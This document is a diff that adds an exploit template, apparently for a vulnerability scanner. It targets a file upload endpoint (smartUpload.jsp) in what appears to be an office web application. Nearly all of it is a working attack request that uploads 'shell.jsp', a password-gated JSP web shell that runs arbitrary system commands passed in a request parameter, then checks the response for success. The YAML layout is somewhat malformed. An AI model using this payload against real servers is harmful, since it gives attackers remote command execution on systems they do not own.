@@ -1,0 +1,32 @@
+author: xss_root
+request:
+  -
+    method: POST
+     payload: /defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0
+   
+    headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+        Cookie: JSESSIONID=PjXnh6bLTzy0ygQf41vWctGPLGkSvkJ6J1yS3ppzJmCvVFQZgm1r!1156443419
+        Connection: close
+        data: "\
+            ------WebKitFormBoundary{{rboundary}}\r\n\
+            Content-Disposition: form-data; name=\"photo\"; filename=\"shell.jsp\"\r\n\
+            Content-Type: application/octet-stream\r\n\
+            \r\n\
+            <% if(\"023\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"<pre>\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"</pre>\"); } %>\r\n\
+            ------WebKitFormBoundary{{rboundary}}\r\n\
+            Content-Disposition: form-data; name=\"continueUpload\"\r\n\
+            \r\n\
+            1\r\n\
+            ------WebKitFormBoundary{{rboundary}}\r\n\
+            Content-Disposition: form-data; name=\"submit\"\r\n\
+            \r\n\
+            上传继续\r\n\
+            ------WebKitFormBoundary{{rboundary}}--\r\n\
+          "
+    keybord: upload_success
+    status: 200
